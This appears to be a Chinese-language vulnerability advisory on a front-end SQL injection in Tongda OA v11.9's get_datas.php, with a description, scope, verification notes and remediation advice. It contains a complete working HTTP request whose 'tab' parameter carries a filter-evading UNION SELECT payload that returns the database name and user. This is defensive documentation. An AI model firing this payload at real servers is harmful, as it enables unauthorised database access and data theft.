---
source: "https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/tongda/tongda-oav11.9-sql%E6%B3%A8%E5%85%A5.yaml"
version: "来源标注 v11.9；其他版本范围未披露"
---

# 通达OA v11.9 get_datas.php SQL注入漏洞

## 漏洞描述

通达 OA v11.9 的 `/general/reportshop/utils/get_datas.php` 被公开 PoC 列为前台 SQL 注入入口。请求在 `tab` 参数中构造查询表达式，并以数据库名和数据库用户回显识别注入。该请求携带 `USER_ID=OfficeTask` 与空密码，适用条件需要结合目标配置确认。

## 影响范围

来源标注 v11.9；其他版本范围未披露。本文按公开 PoC 所列产品记录，不据此扩展为全版本受影响。

## 公开验证方法

```http
GET /general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5%20whe%5Cre%201=%7B%60%5C=%27%60%201%7D%20un%5Cion%20(s%5Celect%20database(),%20us%5Cer())--%20%27 HTTP/1.1
Host: example.invalid
```

上例对原始 YAML 的请求目标作 URL 编码，保留了反斜杠、花括号及反引号等原有字符。来源检查 200 状态码和 `td_oa`；人工核对应确认响应实际包含查询返回的数据库信息，排除固定产品文本或错误页。本文没有验证过滤绕过机制或扩展为数据导出，未进行本地复现。

## 修复建议

向通达获取适用安全更新。对报表查询接口执行服务端权限检查，避免由外部参数直接拼接表名或查询片段。

## 参考链接

- [LittleBear4/OA-EXPTOOL 原始 PoC（固定提交）](https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/tongda/tongda-oav11.9-sql%E6%B3%A8%E5%85%A5.yaml)
